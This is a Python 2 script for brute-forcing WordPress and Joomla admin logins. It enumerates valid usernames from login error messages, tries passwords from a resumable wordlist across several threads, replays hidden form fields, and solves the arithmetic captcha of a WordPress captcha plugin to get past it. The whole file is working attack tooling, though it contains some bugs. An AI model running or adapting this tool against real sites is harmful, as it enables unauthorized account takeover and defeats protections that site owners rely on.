import urllib2
import urllib
import cookielib
import threading
import sys
import Queue

from HTMLParser import HTMLParser


class Bruter(object):
    def __init__(self, target_url = None, username=None, passwords_list=None, usernames_list = None, user_threads=1, cms=None, resume = None):
        self.target_url = target_url
        self.target_post = target_url
        self.username = username
        self.found = False
        self.cms = cms
        self.resume = resume
        self.password_q = self.build_wordlist(passwords_list)
        self.username_q = self.build_wordlist(usernames_list)
        self.threads = user_threads
        self.unprobable_password = "/.,.,adsfasdkkkdfjlk3//.3.,,,.kjlksdf"
        self.discovered_usernames = []
        print "Finished setting up Bruter object"
        self.set_cms()
    
    def set_cms(self):
        if self.cms == 'wordpress':
            self.username_field= "log"
            self.password_field= "pwd"
            self.success_check = "Dashboard"

        elif self.cms == 'joomla':
            self.username_field= "username"
            self.password_field= "passwd"
            self.success_check = "Control Panel"

    def get_discovered_usernames(self):
        return self.discovered_usernames

    def run_username_bruteforce(self):
       print("Launching the attack using %i threads"%self.threads)
       if self.threads <2:
           self.web_username_bruter()
       else:
           for i in range(self.threads):
               t = threading.Thread(target=self.web_username_bruter)
               t.start()
               t.join()

    def run_password_bruteforce(self):
       print("Launching the attack using %i threads"%self.threads)
       if self.threads <2:
           self.web_password_bruter()
       else:
           for i in range(self.threads):
               t = threading.Thread(target=self.web_password_bruter)
               t.start()
               t.join()

    def web_password_bruter(self):

        #loop until end of password list or until password found
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            #creating a cookielib object to handle the cookies
            #cookie will be store in the file "cookies"
            jar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
            response = opener.open(self.target_url)
            page = response.read()
#            print('Here is the page')
#            print(page)

            print "Trying: %s : %s (%d left)" % (self.username,brute,
                    self.password_q.qsize())
            
            # parse out the hidden fields
            parser = BruteParser()
            #This method feed the html code received to the 
            #BruteParser. The over written handle_starttag 
            #method will take care of modifying it.
            parser.feed(page)

            #getting the all the name/value pairs in the inputs tag
            #from the html response
            post_tags = parser.tag_results

            #check if captch block was found
            #and set up the values
            if parser.data_captcha_block:
                #create and fill the captcha handler
                captcha_handler = CaptchaHandler()
                captcha_handler.value1 = parser.data_captcha_block[3]
                captcha_handler.value2 = parser.data_captcha_block[4].replace('=','')
                captcha_handler.operator = parser.charref_captcha_block or parser.entityref_captcha_block 

                #compute the captcha value
                captcha_value = captcha_handler.compute_captcha_value()
                post_tags['ux_txt_captcha_input'] = captcha_value


            # add our username and password fields
            post_tags[self.username_field] = self.username
            post_tags[self.password_field] = brute
            print(post_tags)
            login_data = urllib.urlencode(post_tags)
            print(login_data)

            #Not sure we really need a target_post here.
            login_response = opener.open(self.target_post, login_data)
            login_result = login_response.read()
            #print(login_result)

            if not "Invalid username":
                print("Username %s is valid"%self.username)
            if self.success_check in login_result:
                self.found = True
                print "[*] Bruteforce successful."
                print "[*] Username: %s" % self.username
                print "[*] Password: %s" % brute
                print "[*] Waiting for other threads to exit..."


    def web_username_bruter(self):

        #loop until end of password list or until password found
        while not self.username_q.empty():
            brute = self.username_q.get().rstrip()

            #creating a cookielib object to handle the cookies
            #cookie will be store in the file "cookies"
            jar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
            response = opener.open(self.target_url)
            page = response.read()

            print "Trying: %s (%d left)" % (brute, self.username_q.qsize())
            
            # parse out the hidden fields
            parser = BruteParser()
            #This method feed the html code received to the 
            #BruteParser. The over written handle_starttag 
            #method will take care of modifying it.
            parser.feed(page)

            #getting the all the name/value pairs in the inputs tag
            #from the html response
            post_tags = parser.tag_results

            #check if captch block was found
            #and set up the values
            if parser.data_captcha_block:
                #create and fill the captcha handler
                captcha_handler = CaptchaHandler()
                captcha_handler.value1 = parser.data_captcha_block[3]
                captcha_handler.value2 = parser.data_captcha_block[4].replace('=','')
                captcha_handler.operator = parser.entityref_captcha_block

                #compute the captcha value
                captcha_value = captcha_handler.compute_captcha_value(page)

            # add our username and password fields
            post_tags[self.username_field] = brute
            post_tags[self.password_field] = self.unprobable_password
            login_data = urllib.urlencode(post_tags)
            login_response = opener.open(self.target_post, login_data)
            login_result = login_response.read()
            #print(login_result)

            if not "Invalid username" in login_result:
                print("Username %s is valid" %brute)
                self.discovered_usernames.append(brute)


    def build_wordlist(self, wordlist_file):

        print("Building the word list")
        # read in the word list
        fd = open(wordlist_file,"rb")
        raw_words = fd.readlines()
        fd.close()
        found_resume = False
        words= Queue.Queue()
    
        for word in raw_words:
            word = word.rstrip()
            if self.resume is not None:
                if found_resume:
                    words.put(word)
                else:
                    if word == self.resume:
                        found_resume = True
                        print "Resuming wordlist from: %s" % self.resume
            else:
                words.put(word)
    
        return words


class BruteParser(HTMLParser):
    '''Class that will check the HTML code from the retrieved
        and get the hidden parameter to repost.
        It can also deal with some captcha.'''

    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}
        self.tag = ""
        self.captcha_block = False
        self.data_captcha_block = []
        self.entityref_captcha_block = ''
        self.charref_captcha_block = ''

    def handle_starttag(self, tag, attrs):
        '''check for the star tags, to get the input values
            and check if a captcha is present'''

        #here, we store the input values in a dictionary
        #to resubmit them
        if tag == "input":
            self.tag == "input"
            tag_name = None
            tag_value = None
            for name,value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
            if tag_name is not None:
                self.tag_results[tag_name] = value

        #check if this tag contains the captcha block
        #starting point to spot some captcha
        if tag == 'p':
            for name, value in attrs:
                #check whether we enter the captach block to 
                #to analyse it
                if name == 'class' and value == 'cptch_block':
                    self.captcha_block = True


    def handle_endtag(self, tag):
        #if we see closing tag p, means we are out of
        #captcha block
        if tag =='p':
            self.captcha_block = False

    def handle_data(self, data):
        '''capturing data. If we are in the captcha block, 
            only the indeces 3 and 4 are of interest for the calculation
            of the captcha value'''

        #if we are in captcha block we capture the data
        if self.captcha_block:
            #only the index 3 and 4 are useful, the rest is garbage
            self.data_captcha_block.append(data)

    def handle_entityref(self, entity):
        '''check some entityref. That is how the operator
            for logical captcha is encoded'''
        if self.captcha_block:
            self.entityref_captcha_block = entity

    def handle_charref(self, char):
        '''check some entityref. That is how the operator
            for logical captcha is encoded'''
        if self.captcha_block:
            self.charref_captcha_block = char

class CaptchaHandler:
    ''' Class to handle the captcha from the Captcha Bank plugin
        in Wordpress'''

    def __init__(self):
        self.value1 = 0
        self.value2 = 0
        self.operator = ''

    def compute_captcha_value(self):
        '''If the captcha is numerical calculation, 
        this method makes the calculation from the output of 
        the BruteHTMLParser'''

        #check if the integers are integers
        self.sanity_check_captcha_values()

        #check the operator
        self.sanity_check_captcha_operator()

        if self.operator == 'minus':
            return self.value1 - self.value2

        elif self.operator == 'times':
            return self.value1 * self.value2

        elif self.operator == 'plus':
            return self.value1 + self.value2
        
        else:
            return self.value1 / self.value2


    def sanity_check_captcha_values(self):
        '''Sanity check for the input values'''
        self.value1 = int(self.value1.replace('=',''))
        self.value2 = int(self.value2.replace('=',''))
 
    def sanity_check_captcha_operator(self):
        '''Sometimes the operator is not cleary mentionned.
            We have to find a way to determine it...'''

        if self.operator == '43':
            self.operator = 'plus'
        elif self.operator == '8260':
            self.operator = 'divide'
